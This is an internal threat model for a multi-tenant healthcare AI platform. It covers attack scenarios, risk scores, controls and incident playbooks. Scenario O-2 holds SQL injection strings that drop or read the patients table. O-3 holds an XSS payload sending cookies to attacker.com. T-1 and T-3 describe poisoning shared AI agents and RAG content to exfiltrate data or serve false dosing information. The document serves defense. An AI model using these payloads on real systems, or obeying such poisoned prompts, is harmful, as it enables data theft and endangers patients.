# 3-Level Multi-Tenant Threat Model
## VITAL Healthcare Platform

**Version:** 1.0
**Date:** 2025-11-26
**Classification:** CONFIDENTIAL - Internal Security Document

---

## 1. Architecture Overview

### 1.1 Three-Level Hierarchy

```
Platform Level (VITAL)
├─ Tenant: Pharma Industry
│  ├─ Organization: Novartis (isolated)
│  ├─ Organization: Pfizer (isolated)
│  └─ Organization: Roche (isolated)
│
├─ Tenant: Digital Health
│  ├─ Organization: Mayo Clinic (isolated)
│  ├─ Organization: Cleveland Clinic (isolated)
│  └─ Organization: Kaiser Permanente (isolated)
│
└─ Tenant: Biotech Startups
   ├─ Organization: Moderna (isolated)
   ├─ Organization: BioNTech (isolated)
   └─ Organization: Ginkgo Bioworks (isolated)
```

### 1.2 Sharing Model

**Organization Level (Highest Isolation):**
- Full data isolation between organizations
- Novartis CANNOT access Pfizer data
- Mayo Clinic CANNOT access Cleveland Clinic data
- RLS enforced at database level

**Tenant Level (Shared Resources):**
- Shared: AI agents, RAG databases, tool libraries
- Example: "Pharma Regulatory Agent" accessible to all pharma companies
- Example: "Clinical Trial Protocol Generator" shared across healthcare orgs
- Access logged and audited

**Platform Level (System Resources):**
- Shared: System templates, foundation models, infrastructure
- Example: "VITAL Assistant" accessible to all tenants
- Example: Base agent templates, workflow libraries

### 1.3 Data Classification

| Data Type | Isolation Level | Encryption | Audit | Sharing Allowed |
|-----------|----------------|------------|-------|-----------------|
| Patient PHI | Organization | AES-256 at rest | All access | NEVER |
| Organization business data | Organization | AES-256 at rest | All modifications | With explicit consent |
| User credentials | Organization | Bcrypt + TLS | All auth events | NEVER |
| Tenant-level agents | Tenant | TLS in transit | All executions | Within tenant orgs |
| Platform templates | Platform | TLS in transit | Creation/modification | All tenants |

---

## 2. Threat Actors & Motivations

### 2.1 External Threat Actors

**Nation-State Actors (APT Groups)**
- Motivation: Steal pharmaceutical research, clinical trial data, patient information
- Capabilities: Advanced persistent threats, zero-day exploits, social engineering
- Target: Organization-level data (Novartis drug pipeline, Mayo patient records)
- Attack Vectors:
  - Supply chain attacks (compromised dependencies)
  - Targeted spear-phishing of admin users
  - Exploitation of unpatched vulnerabilities
  - API abuse and brute-force attacks

**Ransomware Groups**
- Motivation: Financial gain via encryption and data exfiltration
- Capabilities: Automated scanning, credential stuffing, lateral movement
- Target: Entire tenant infrastructure, backups, PHI databases
- Attack Vectors:
  - Phishing emails with malicious attachments
  - Exploitation of public-facing services
  - Credential stuffing from leaked password databases
  - RDP/SSH brute-force attacks

**Hacktivists**
- Motivation: Political/ideological reasons, publicity
- Capabilities: DDoS attacks, defacement, data leaks
- Target: High-profile organizations (pharma companies, hospitals)
- Attack Vectors:
  - DDoS amplification attacks
  - SQL injection and XSS attacks
  - Social media manipulation
  - Public disclosure of vulnerabilities

**Competitors**
- Motivation: Steal competitive intelligence, disrupt operations
- Capabilities: Social engineering, insider recruitment, bribery
- Target: Organization-level business data, research insights
- Attack Vectors:
  - Social engineering of employees
  - Recruitment of insiders
  - Legal discovery abuse
  - Third-party service compromise

### 2.2 Internal Threat Actors

**Malicious Insiders (Employees)**
- Motivation: Financial gain, revenge, ideology
- Capabilities: Authorized access, knowledge of systems, trusted credentials
- Target: PHI, intellectual property, competitor data
- Attack Vectors:
  - Data exfiltration via authorized access
  - Privilege escalation
  - Planting backdoors for post-termination access
  - Sabotage of systems and data

**Negligent Insiders**
- Motivation: None (accidental)
- Capabilities: Authorized access, lack of security awareness
- Target: Any data they have access to
- Attack Vectors:
  - Falling for phishing attacks
  - Misconfiguring security settings
  - Sharing credentials
  - Using weak passwords
  - Accidental data disclosure

**Compromised Admin Accounts**
- Motivation: External actor using stolen credentials
- Capabilities: Admin privileges, access to multiple organizations
- Target: Entire tenant data, system configuration
- Attack Vectors:
  - Credential stuffing (reused passwords)
  - Keylogging malware
  - Man-in-the-middle attacks
  - Session hijacking

### 2.3 Third-Party Risks

**Compromised Service Providers**
- Examples: AWS, Supabase, Stripe, Notion, Slack
- Motivation: Varied (depends on attacker compromise method)
- Attack Vectors:
  - Supply chain attacks (SolarWinds-style)
  - Compromised service provider employee
  - Vulnerabilities in third-party APIs
  - Data breaches at service provider

**Malicious or Negligent Business Associates**
- Examples: Consulting firms, auditors, implementation partners
- Motivation: Financial gain, corporate espionage
- Attack Vectors:
  - Excessive access requests beyond minimum necessary
  - Data retention beyond contractual terms
  - Unauthorized subcontracting
  - Inadequate security at BA infrastructure

---

## 3. Attack Scenarios by Level

### 3.1 Platform-Level Attacks

#### Scenario P-1: Master Key Compromise
**Description:** Attacker gains access to the master encryption key used to encrypt tenant-specific keys

**Attack Chain:**
1. Compromise AWS Secrets Manager via stolen IAM credentials
2. Retrieve master encryption key
3. Access all tenant encryption keys
4. Decrypt all PHI across all tenants

**Impact:** CATASTROPHIC
- All PHI exposed across all tenants
- Complete HIPAA breach
- Potential criminal liability
- Business extinction event

**Likelihood:** LOW (if secrets manager properly configured)

**Mitigations:**
- Store master key in HSM (Hardware Security Module)
- Implement key sharding (requires multiple keys to decrypt)
- Use AWS KMS with strict IAM policies
- Enable CloudTrail logging for all key access
- Implement anomaly detection for key usage patterns
- Require MFA for key access

**Detection:**
- CloudTrail alerts for Secrets Manager access outside normal patterns
- Anomalous decryption requests across multiple tenants
- Unusual data export volumes

---

#### Scenario P-2: Service Role Key Leak
**Description:** SUPABASE_SERVICE_ROLE_KEY leaks to GitHub, logs, or monitoring tools

**Attack Chain:**
1. Service role key committed to GitHub repository
2. Automated bot scrapes GitHub for exposed keys
3. Attacker uses key to bypass all RLS policies
4. Full database access across all tenants

**Impact:** CATASTROPHIC
- All data exposed (PHI, business data, credentials)
- Complete tenant isolation bypass
- Zero audit trail (service role operations not logged properly)

**Likelihood:** MEDIUM (common developer mistake)

**Mitigations:**
- NEVER use service role key in application code
- Use anon key + user authentication only
- Implement GitHub secret scanning (pre-commit hooks)
- Rotate service role key monthly
- Add RLS policies to block service role for non-VITAL tenants
- Store service role key in CI/CD secrets only

**Detection:**
- GitHub secret scanning alerts
- Monitoring for service role usage outside of admin operations
- Anomalous database query patterns

---

#### Scenario P-3: Container Escape
**Description:** Attacker escapes Docker container to access host system

**Attack Chain:**
1. Exploit vulnerability in Docker runtime (e.g., CVE-2019-5736)
2. Gain root access on host EC2 instance
3. Access database credentials, encryption keys, other containers
4. Lateral movement to other infrastructure

**Impact:** CRITICAL
- Access to database connection strings
- Access to encryption keys in memory
- Ability to monitor network traffic
- Potential to compromise entire infrastructure

**Likelihood:** LOW (if runtime kept updated)

**Mitigations:**
- Use rootless containers
- Implement AppArmor/SELinux policies
- Keep Docker runtime updated
- Use container runtime security tools (Falco, Sysdig)
- Network segmentation between containers
- Minimal container images (distroless)

**Detection:**
- Unexpected process execution on host
- Network connections from host to unexpected destinations
- File modifications outside of container filesystems

---

### 3.2 Tenant-Level Attacks

#### Scenario T-1: Shared Agent Poisoning
**Description:** Attacker compromises a tenant-shared AI agent to exfiltrate data from other organizations in the same tenant

**Attack Chain:**
1. Tenant admin creates "helpful" agent with malicious system prompt
2. Shares agent with other organizations in tenant
3. Agent collects sensitive inputs and exfiltrates to attacker-controlled endpoint
4. Organizations unknowingly leak proprietary information

**Impact:** HIGH
- Cross-organization data leakage within tenant
- Intellectual property theft
- Competitive intelligence gathering

**Likelihood:** MEDIUM (social engineering of admins)

**Mitigations:**
- Code review for all shared agents before approval
- Sandboxed agent execution environment
- Monitoring of agent network connections
- Rate limiting on agent API calls
- Audit logging of all agent inputs/outputs
- Require multi-party approval for agent sharing

**Detection:**
- Anomalous network connections from agent execution environment
- High volume of data processed by recently created agent
- Multiple organizations reporting similar suspicious behavior

---

#### Scenario T-2: Tenant Admin Account Takeover
**Description:** Attacker compromises tenant admin account via phishing, credential stuffing, or social engineering

**Attack Chain:**
1. Phishing email tricks tenant admin into revealing credentials
2. Attacker logs in as tenant admin (no MFA required currently)
3. Grants themselves access to all organizations in tenant
4. Exfiltrates data from multiple organizations
5. Creates backdoor accounts for persistent access

**Impact:** CRITICAL
- Access to multiple organizations within tenant
- Ability to modify shared resources (agents, RAGs)
- Potential for widespread data exfiltration
- Difficult to detect (looks like legitimate admin activity)

**Likelihood:** HIGH (phishing is common, no MFA currently enforced)

**Mitigations:**
- **IMMEDIATE: Enforce MFA for all tenant admin accounts**
- Implement IP whitelisting for admin accounts
- Alert on unusual admin activity (time, location, actions)
- Require approval workflow for sensitive admin actions
- Implement break-glass procedures for emergency access
- Session timeout < 1 hour for admin accounts

**Detection:**
- Login from unusual location/IP
- Multiple organizations accessed in short time
- Creation of new users with admin privileges
- Bulk data export operations
- Access outside of business hours

---

#### Scenario T-3: Tenant RAG Database Poisoning
**Description:** Attacker injects malicious content into tenant-level RAG (Retrieval-Augmented Generation) database

**Attack Chain:**
1. Attacker gains access to tenant-shared RAG content management
2. Injects malicious documents with:
   - False medical information (dosing, drug interactions)
   - Phishing links
   - Data exfiltration prompts
3. RAG serves poisoned content to all organizations in tenant
4. Organizations make decisions based on incorrect information

**Impact:** CRITICAL
- Patient safety risk (incorrect medical information)
- Legal liability for incorrect medical advice
- Reputational damage
- Loss of trust in platform

**Likelihood:** MEDIUM (if content management lacks access controls)

**Mitigations:**
- Content verification workflow before RAG ingestion
- Provenance tracking for all RAG documents
- Checksum validation to detect tampering
- Version control for RAG content with rollback capability
- Restrict RAG write access to verified content sources only
- Implement content moderation for user-contributed RAG content

**Detection:**
- Sudden changes to RAG content (version control diff)
- User reports of incorrect information
- Anomalous queries returning suspicious content
- Content moderation flags

---

### 3.3 Organization-Level Attacks

#### Scenario O-1: Cross-Organization Data Access via API Manipulation
**Description:** Attacker from Pfizer manipulates API calls to access Novartis data

**Attack Chain:**
1. Pfizer user logs in with valid credentials
2. Intercepts API request using browser dev tools
3. Modifies `x-tenant-id` header or `tenant_id` cookie to Novartis org ID
4. API middleware does not validate user-org membership
5. RLS policies allow access because context is set to Novartis
6. Attacker downloads Novartis proprietary drug research

**Impact:** CATASTROPHIC
- Complete bypass of organization isolation
- Unauthorized PHI access (HIPAA violation)
- Intellectual property theft
- Competitive intelligence leakage

**Likelihood:** VERY HIGH (current vulnerability exists)

**Mitigations (CRITICAL):**
- **IMMEDIATE: Implement user-to-organization membership validation**
- Validate tenant_id against user's authorized organizations in `user_organizations` table
- NEVER trust client-provided tenant_id without validation
- Implement API gateway to enforce organization membership
- Log all cross-organization access attempts (even denied ones)
- Alert security team on repeated attempts

**Detection:**
- API requests with mismatched user_id and tenant_id
- Denied cross-organization access attempts
- Anomalous data access patterns

---

#### Scenario O-2: SQL Injection via User Input
**Description:** Attacker injects SQL code via user-controllable fields to bypass RLS

**Attack Chain:**
1. Attacker creates agent with malicious name: `Agent'; DROP TABLE patients; --`
2. Application inserts into database without proper parameterization
3. SQL injection executes, dropping patients table
4. All patient data lost

**Alternative Attack:**
```sql
-- Attacker sets agent description to:
Test' UNION SELECT * FROM patients WHERE '1'='1

-- Results in query:
SELECT * FROM agents WHERE description = 'Test' UNION SELECT * FROM patients WHERE '1'='1'

-- Attacker receives patient data in agent query results
```

**Impact:** CRITICAL
- Data loss (if DROP TABLE)
- Data exfiltration (if UNION SELECT)
- RLS bypass
- HIPAA violation

**Likelihood:** MEDIUM (if parameterized queries not used)

**Mitigations:**
- **ALWAYS use parameterized queries / prepared statements**
- Input validation on all user-provided data
- Whitelist allowed characters (no semicolons, quotes, etc.)
- Use ORM framework with built-in SQL injection protection
- Database user with minimal permissions (no DROP, etc.)
- Web Application Firewall (WAF) to detect SQL injection patterns

**Detection:**
- WAF detects SQL injection patterns
- Database logs show failed SQL statements
- Anomalous error rates in application logs

---

#### Scenario O-3: Session Hijacking via XSS
**Description:** Attacker injects malicious JavaScript to steal session tokens

**Attack Chain:**
1. Attacker creates agent with description containing XSS payload:
   ```html
   <img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">
   ```
2. Victim views agent in agent store
3. XSS executes, sending session cookie to attacker
4. Attacker uses stolen session cookie to impersonate victim
5. Accesses victim's organization data

**Impact:** HIGH
- Session hijacking
- Unauthorized access as legitimate user
- Difficult to detect (uses valid session token)

**Likelihood:** MEDIUM (if input sanitization lacking)

**Mitigations:**
- Sanitize all user input before rendering (use DOMPurify or similar)
- Set HttpOnly flag on cookies (prevent JavaScript access)
- Implement Content Security Policy (CSP) headers
- Use SameSite=Strict cookie attribute
- Escape all user-generated content in templates
- Regular security scanning for XSS vulnerabilities

**Detection:**
- CSP violation reports
- Unusual session activity (IP changes, location changes)
- User reports of suspicious activity

---

#### Scenario O-4: Privilege Escalation via Role Manipulation
**Description:** Regular user elevates privileges to admin via JWT token tampering

**Attack Chain:**
1. User logs in as `member` role
2. Decodes JWT token using jwt.io
3. Modifies role claim from `member` to `admin`
4. Re-encodes JWT with same signature (if signature not verified properly)
5. Makes API calls with elevated privileges
6. Gains access to admin-only functions

**Impact:** HIGH
- Unauthorized administrative access
- Ability to modify organization settings
- Ability to view all users' data
- Potential for creating backdoor accounts

**Likelihood:** LOW (if JWT signature properly verified)

**Mitigations:**
- **ALWAYS verify JWT signature on server side**
- Use short-lived access tokens (15 minutes)
- Implement refresh token rotation
- Store roles in database, not just in JWT
- Re-validate role on every privileged operation
- Audit all admin actions

**Detection:**
- Mismatched role between JWT and database
- Admin actions from non-admin users
- JWT signature verification failures

---

#### Scenario O-5: Insider Data Exfiltration
**Description:** Authorized user with legitimate access exfiltrates patient data for financial gain

**Attack Chain:**
1. Clinical researcher has legitimate access to patient database
2. Queries all patients and downloads as CSV
3. Uploads to personal cloud storage (Google Drive, Dropbox)
4. Sells patient data on dark web

**Impact:** CRITICAL
- HIPAA breach ($1.5M+ fines)
- Patient privacy violation
- Legal liability
- Criminal charges
- Reputational damage

**Likelihood:** MEDIUM (insiders are hard to prevent)

**Mitigations:**
- Implement data loss prevention (DLP) tools
- Monitor bulk data exports
- Require approval for exports > 100 records
- Watermark exported data with user ID
- Block personal cloud storage domains (Google Drive, Dropbox) at network level
- Implement user behavior analytics (UBA) to detect anomalies
- Alert on unusual data access patterns

**Detection:**
- Bulk query patterns (SELECT * FROM patients)
- Large data exports
- Access to records outside normal workflow
- Access outside business hours
- Network traffic to personal cloud storage

---

### 3.4 Patient/User-Level Attacks

#### Scenario U-1: Patient Identity Theft
**Description:** Attacker uses stolen patient credentials to access medical records

**Attack Chain:**
1. Patient uses weak password (`password123`)
2. Password leaked in unrelated data breach
3. Attacker uses credential stuffing attack
4. Logs in as patient (no MFA enforced)
5. Views all medical records, prescriptions, billing info

**Impact:** MEDIUM
- Unauthorized PHI access (HIPAA violation)
- Identity theft
- Potential for medical fraud

**Likelihood:** MEDIUM (credential stuffing is common)

**Mitigations:**
- Enforce strong password requirements (12+ chars, complexity)
- Implement MFA for all users (especially patients)
- Monitor for credential stuffing (multiple failed logins)
- Rate limit login attempts
- Alert users on login from new device/location
- Implement CAPTCHA after 3 failed logins

**Detection:**
- Multiple failed login attempts
- Login from unusual location/device
- Access patterns inconsistent with normal patient behavior

---

## 4. Trust Boundaries & Data Flows

### 4.1 Trust Boundaries

```
┌─────────────────────────────────────────────────────────────┐
│ UNTRUSTED ZONE: Public Internet                            │
│ - User browsers                                             │
│ - Mobile apps                                               │
│ - Third-party APIs                                          │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ DMZ: Edge Services (CloudFront CDN + WAF)                   │
│ - DDoS protection                                           │
│ - Rate limiting                                             │
│ - SSL/TLS termination                                       │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ APPLICATION LAYER (Private Subnet)                          │
│ - Next.js frontend                                          │
│ - API Gateway                                               │
│ - Authentication middleware                                 │
│ - RLS context setting                                       │
│                                                             │
│ TRUST BOUNDARY: User authentication required               │
│ TRUST BOUNDARY: Tenant validation required                 │
└────────────────────┬────────────────────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────────────────────┐
│ DATA LAYER (Private Subnet, No Internet Access)            │
│ - Supabase PostgreSQL database                             │
│ - RLS policies enforce tenant isolation                    │
│ - Encrypted at rest (EBS encryption)                       │
│                                                             │
│ TRUST BOUNDARY: RLS policies must be enforced              │
│ TRUST BOUNDARY: Service role access restricted             │
└─────────────────────────────────────────────────────────────┘
```

### 4.2 Critical Data Flows

**Flow 1: User Authentication & Tenant Selection**
```
User Browser
  ↓ (1) POST /auth/login {email, password}
API Gateway (TLS)
  ↓ (2) Verify credentials with Supabase Auth
Supabase Auth
  ↓ (3) Return JWT token
API Gateway
  ↓ (4) Query user_organizations table to get allowed tenants
Database
  ↓ (5) Return list of organizations user belongs to
API Gateway
  ↓ (6) Set tenant_id cookie (validated against allowed orgs)
User Browser
  ↓ (7) Subsequent requests include tenant_id cookie
API Gateway
  ↓ (8) VALIDATE tenant_id against user's memberships
  ↓ (9) Call set_tenant_context(validated_tenant_id)
Database
  ↓ (10) RLS policies filter all queries by tenant_id
```

**CRITICAL CONTROL POINTS:**
- Step 8: MUST validate tenant_id against user_organizations
- Step 9: ONLY set context after validation succeeds
- Step 10: RLS policies must be enabled on all tables

---

**Flow 2: PHI Access & Audit Logging**
```
User Browser
  ↓ (1) GET /api/patients/123
API Gateway
  ↓ (2) Verify JWT, validate tenant membership
  ↓ (3) set_tenant_context(validated_tenant_id)
  ↓ (4) Query patients table (RLS auto-filters by tenant_id)
Database
  ↓ (5) Return encrypted PHI
Application
  ↓ (6) Decrypt PHI using tenant-specific key
  ↓ (7) Log PHI access event to audit_logs
  ↓ (8) Return decrypted data to user
User Browser
```

**CRITICAL CONTROL POINTS:**
- Step 3: Tenant context must be set before every query
- Step 4: RLS policies prevent cross-tenant access
- Step 5: Data returned is encrypted in database
- Step 7: ALL PHI access must be logged (no exceptions)

---

**Flow 3: Shared Agent Execution**
```
User (Pfizer)
  ↓ (1) Execute "Pharma Regulatory Agent" (tenant-shared)
API Gateway
  ↓ (2) Verify agent is shared with user's tenant
  ↓ (3) Check agent_tenant_access table
Database
  ↓ (4) Confirm Pfizer tenant has access grant
API Gateway
  ↓ (5) Execute agent in sandboxed environment
Agent Execution Environment
  ↓ (6) Agent processes user input
  ↓ (7) Agent queries tenant-specific data (RLS enforced)
  ↓ (8) Log agent execution with input/output hashes
  ↓ (9) Return results to user
User (Pfizer)
```

**CRITICAL CONTROL POINTS:**
- Step 3: Validate sharing grant before execution
- Step 5: Sandboxed environment prevents network exfiltration
- Step 7: RLS ensures agent only accesses Pfizer data
- Step 8: Audit log captures what data was processed

---

## 5. Attack Surface Analysis

### 5.1 API Endpoints

**High-Risk Endpoints:**

| Endpoint | Risk Level | Threat | Mitigation |
|----------|-----------|--------|------------|
| `POST /api/auth/login` | CRITICAL | Brute force, credential stuffing | Rate limiting (5 attempts/min), CAPTCHA, MFA |
| `GET /api/agents` | HIGH | Cross-tenant access via header manipulation | Validate tenant membership |
| `POST /api/agents` | HIGH | SQL injection via agent name/description | Input sanitization, parameterized queries |
| `DELETE /api/agents/:id` | HIGH | Unauthorized deletion, IDOR | Ownership validation, soft delete |
| `POST /api/phi/export` | CRITICAL | Bulk PHI exfiltration | Approval workflow, rate limiting, DLP |
| `GET /api/admin/users` | CRITICAL | Privilege escalation | Admin role verification, IP whitelist |
| `POST /api/tenant/share` | HIGH | Unauthorized resource sharing | Multi-party approval, audit logging |

### 5.2 Database Tables

**High-Value Targets:**

| Table | Sensitivity | Attack Vector | Protection |
|-------|------------|---------------|------------|
| `patients` | CRITICAL (PHI) | SQL injection, RLS bypass | Column-level encryption, RLS, audit logging |
| `auth.users` | CRITICAL (credentials) | Credential stuffing | Bcrypt hashing, MFA, rate limiting |
| `audit_logs` | HIGH (compliance) | Log tampering, deletion | Immutable logs, checksum chaining |
| `user_organizations` | HIGH (authorization) | Privilege escalation | RLS, foreign key constraints |
| `encryption_keys` | CRITICAL (key material) | Key theft | Encrypted with master key, HSM storage |
| `agents` | MEDIUM | IP theft, code injection | RLS, input validation |
| `conversations` | HIGH (business data) | Cross-tenant access | RLS, tenant_id validation |

### 5.3 Third-Party Integrations

**External Attack Surface:**

| Integration | Data Shared | Risk | Mitigation |
|-------------|-------------|------|------------|
| Supabase Auth | User credentials | Account takeover if Supabase breached | BAA, encryption in transit, MFA |
| OpenAI API | Agent prompts (may contain PHI) | Data leakage to OpenAI | PHI sanitization, OpenAI BAA, audit logging |
| Stripe | Payment info | Payment fraud | PCI-DSS compliance, tokenization |
| Notion API | Documentation (may contain PHI) | Data leakage | Restrict to non-PHI content, BAA |
| AWS S3 | Backups, logs | Bucket misconfiguration | Encryption at rest, bucket policies, no public access |

---

## 6. Risk Prioritization Matrix

### 6.1 Risk Scoring

**Impact Scale:**
- 1 = Minimal (single user affected, no PHI)
- 2 = Limited (department affected, limited PHI)
- 3 = Significant (organization affected, substantial PHI)
- 4 = Severe (tenant affected, mass PHI exposure)
- 5 = Catastrophic (platform affected, total compromise)

**Likelihood Scale:**
- 1 = Rare (requires insider knowledge + advanced skills)
- 2 = Unlikely (requires specific conditions)
- 3 = Possible (known attack method, moderate skill)
- 4 = Likely (common attack, low skill required)
- 5 = Very Likely (actively exploitable, trivial)

**Risk Score = Impact × Likelihood**

### 6.2 Threat Ranking

| Threat | Impact | Likelihood | Risk Score | Priority |
|--------|--------|-----------|------------|----------|
| O-1: Cross-org data access (client-controlled tenant) | 5 | 5 | **25** | CRITICAL |
| P-2: Service role key leak | 5 | 3 | **15** | CRITICAL |
| T-2: Tenant admin account takeover (no MFA) | 4 | 4 | **16** | CRITICAL |
| O-5: Insider data exfiltration | 4 | 3 | **12** | HIGH |
| T-1: Shared agent poisoning | 4 | 3 | **12** | HIGH |
| O-2: SQL injection | 4 | 3 | **12** | HIGH |
| T-3: RAG database poisoning | 4 | 2 | **8** | HIGH |
| O-3: Session hijacking via XSS | 3 | 3 | **9** | MEDIUM |
| P-1: Master key compromise | 5 | 1 | **5** | MEDIUM |
| O-4: Privilege escalation via JWT | 3 | 2 | **6** | MEDIUM |
| U-1: Patient identity theft | 2 | 3 | **6** | MEDIUM |
| P-3: Container escape | 4 | 1 | **4** | LOW |

---

## 7. Security Requirements by Level

### 7.1 Platform-Level Controls

**CRITICAL:**
- [ ] Master encryption key stored in HSM (AWS KMS)
- [ ] Service role key NEVER used in application code
- [ ] RLS policies block service role for non-VITAL tenants
- [ ] All infrastructure changes logged in CloudTrail
- [ ] Secrets rotation every 90 days
- [ ] Network segmentation (database in private subnet)

**HIGH:**
- [ ] WAF rules for SQL injection, XSS, DDoS
- [ ] Container runtime security (Falco)
- [ ] Vulnerability scanning (Snyk, Trivy)
- [ ] Incident response plan documented and tested
- [ ] Disaster recovery plan with RTO < 4 hours

**MEDIUM:**
- [ ] Automated security patching
- [ ] Pen testing every 6 months
- [ ] Security awareness training for all employees

### 7.2 Tenant-Level Controls

**CRITICAL:**
- [ ] MFA enforced for all tenant admin accounts
- [ ] Tenant admin session timeout < 1 hour
- [ ] Multi-party approval for agent sharing
- [ ] All shared resource access audited

**HIGH:**
- [ ] Content verification for RAG databases
- [ ] Sandboxed agent execution environment
- [ ] IP whitelisting for admin access
- [ ] Anomaly detection for admin activity

**MEDIUM:**
- [ ] Regular review of shared resource access grants
- [ ] User behavior analytics (UBA)
- [ ] Automated alerts for suspicious activity

### 7.3 Organization-Level Controls

**CRITICAL:**
- [ ] User-to-organization membership validation (IMMEDIATE FIX)
- [ ] Column-level encryption for all PHI
- [ ] Comprehensive audit logging (all PHI access)
- [ ] RLS policies on ALL tables with tenant_id
- [ ] Soft delete filtering in RLS policies

**HIGH:**
- [ ] Input validation and sanitization (all user inputs)
- [ ] Parameterized queries (prevent SQL injection)
- [ ] Content Security Policy (prevent XSS)
- [ ] HttpOnly + SameSite=Strict cookies
- [ ] Data loss prevention (DLP) for bulk exports

**MEDIUM:**
- [ ] Session timeout based on role (1-8 hours)
- [ ] IP binding for sensitive sessions
- [ ] CAPTCHA after failed login attempts
- [ ] User device fingerprinting

---

## 8. Detection & Response

### 8.1 Security Monitoring

**Real-Time Alerts (PagerDuty/Slack):**
- Failed login attempts > 5 in 15 minutes (per user)
- Cross-tenant access denied event
- Service role key usage outside admin operations
- PHI bulk export > 100 records
- Admin account login from new location/IP
- Multiple organizations accessed in < 5 minutes
- SQL injection pattern detected (WAF)
- Encryption key access outside normal pattern

**Daily Security Reports:**
- Summary of failed authentications
- PHI access by user (top 10)
- New admin accounts created
- Shared resource access grants
- Unusual data export volumes
- Security policy violations

**Weekly Security Reviews:**
- Audit log integrity verification
- User account review (inactive, over-privileged)
- Third-party integration review
- Vulnerability scan results
- Penetration test findings

### 8.2 Incident Response Playbooks

**Playbook 1: Suspected Cross-Tenant Data Breach**

1. **IMMEDIATE (< 5 minutes):**
   - Isolate affected user account (suspend)
   - Block IP address at WAF
   - Capture full audit logs for user
   - Alert security team and legal counsel

2. **SHORT-TERM (< 1 hour):**
   - Review audit logs to determine scope
   - Identify all data accessed
   - Assess if PHI was exposed
   - Notify affected organization(s)
   - Preserve evidence for forensics

3. **MEDIUM-TERM (< 24 hours):**
   - Conduct forensic analysis
   - Identify root cause
   - Deploy hotfix if vulnerability found
   - HIPAA breach assessment (> 500 records?)
   - Begin breach notification process if required

4. **LONG-TERM (< 72 hours):**
   - File HIPAA breach report with HHS (if required)
   - Notify affected individuals (if required)
   - Post-incident review
   - Update security controls

---

**Playbook 2: Compromised Admin Account**

1. **IMMEDIATE (< 5 minutes):**
   - Revoke all sessions for compromised account
   - Disable account
   - Reset password
   - Alert security team

2. **SHORT-TERM (< 1 hour):**
   - Review all actions taken by account in last 30 days
   - Identify any unauthorized changes:
     - New users created
     - Permission grants
     - Configuration changes
     - Data exports
   - Revert unauthorized changes

3. **MEDIUM-TERM (< 24 hours):**
   - Conduct forensic analysis of compromise
   - Identify attack vector (phishing, credential stuffing, etc.)
   - Force password reset for all admin accounts
   - Enable MFA for all accounts (if not already)
   - Rotate API keys and service credentials

4. **LONG-TERM (< 72 hours):**
   - User re-training on phishing awareness
   - Review and strengthen admin access controls
   - Post-incident review
   - Update incident response procedures

---

**Playbook 3: Suspected Insider Threat**

1. **IMMEDIATE (< 15 minutes):**
   - DO NOT alert the suspected insider
   - Begin discreet monitoring of their activity
   - Review recent audit logs
   - Alert HR and legal counsel

2. **SHORT-TERM (< 24 hours):**
   - Conduct comprehensive audit of insider's activity
   - Identify all data accessed, exported, or modified
   - Preserve evidence (logs, files, communications)
   - Assess business impact
   - Legal counsel advises on next steps

3. **MEDIUM-TERM (< 1 week):**
   - If threat confirmed, terminate access immediately
   - HR initiates termination process
   - Retrieve company devices
   - Send cease and desist letter (if data exfiltration confirmed)

4. **LONG-TERM (ongoing):**
   - Strengthen insider threat controls (DLP, UBA)
   - Review background check processes
   - Update employee security training
   - Consider legal action if warranted

---

## 9. Compliance Mapping

### 9.1 HIPAA §164.312 Technical Safeguards

| Requirement | Current Status | Gap | Threat Mitigation |
|-------------|---------------|-----|-------------------|
| §164.312(a)(1) Access Control | FAIL | O-1, T-2, O-4 | Implement user-org validation, MFA, RBAC |
| §164.312(a)(2)(i) Unique User ID | PARTIAL | U-1 | Enforce unique IDs, MFA |
| §164.312(a)(2)(iii) Automatic Logoff | PARTIAL | T-2, O-3 | Reduce session timeout to < 4 hours |
| §164.312(a)(2)(iv) Encryption | MISSING | P-1, O-5 | Column-level encryption for PHI |
| §164.312(b) Audit Controls | FAIL | O-5, T-1 | Comprehensive audit logging |
| §164.312(c)(1) Integrity | PARTIAL | T-3, O-2 | Tamper-proof logs, checksums |
| §164.312(d) Authentication | FAIL | T-2, U-1, O-4 | MFA, strong passwords, JWT verification |
| §164.312(e)(1) Transmission | PARTIAL | P-2 | TLS 1.2+, encrypt backups |

### 9.2 GDPR Requirements

| Requirement | Current Status | Gap | Threat Mitigation |
|-------------|---------------|-----|-------------------|
| Art. 5(1)(f) Integrity & Confidentiality | FAIL | O-1, P-2 | Encryption, access controls, RLS |
| Art. 17 Right to Erasure | MISSING | O-5 | Implement data deletion workflow |
| Art. 25 Data Protection by Design | PARTIAL | Multiple | Security by default, privacy-first architecture |
| Art. 32 Security of Processing | PARTIAL | Multiple | Encryption, pseudonymization, regular testing |
| Art. 33 Breach Notification | MISSING | All | Incident response plan, breach detection |

---

## 10. Recommendations

### 10.1 IMMEDIATE Actions (Week 1)

1. **CRITICAL: Fix Cross-Organization Access Vulnerability (O-1)**
   - Create `user_organizations` table
   - Implement user-to-org membership validation in middleware
   - Deploy to production immediately
   - Test with penetration testing
   - **Risk Reduction: 25 → 5 (80% reduction)**

2. **CRITICAL: Remove Service Role Key from Application Code (P-2)**
   - Audit all code for service role key usage
   - Replace with user authentication
   - Rotate service role key
   - Add RLS protection for service role
   - **Risk Reduction: 15 → 3 (80% reduction)**

3. **CRITICAL: Enforce MFA for Admin Accounts (T-2)**
   - Integrate Supabase MFA
   - Force enable for all admin accounts
   - Reduce admin session timeout to 1 hour
   - **Risk Reduction: 16 → 4 (75% reduction)**

### 10.2 SHORT-TERM Actions (Weeks 2-4)

4. **HIGH: Implement Comprehensive Audit Logging (O-5, T-1)**
   - Create audit_logs table with checksum chaining
   - Log all PHI access events
   - Log all security events
   - Implement real-time alerting
   - **Risk Reduction: 12 → 6 (50% reduction)**

5. **HIGH: Column-Level PHI Encryption (P-1, O-5)**
   - Implement encrypt_phi() / decrypt_phi() functions
   - Migrate PHI columns to encrypted storage
   - Implement key rotation
   - **Risk Reduction: 5 → 2 (60% reduction on master key impact)**

6. **HIGH: Input Validation & SQL Injection Prevention (O-2)**
   - Implement Zod schemas for all inputs
   - Audit all queries for parameterization
   - Add WAF rules for SQL injection
   - **Risk Reduction: 12 → 3 (75% reduction)**

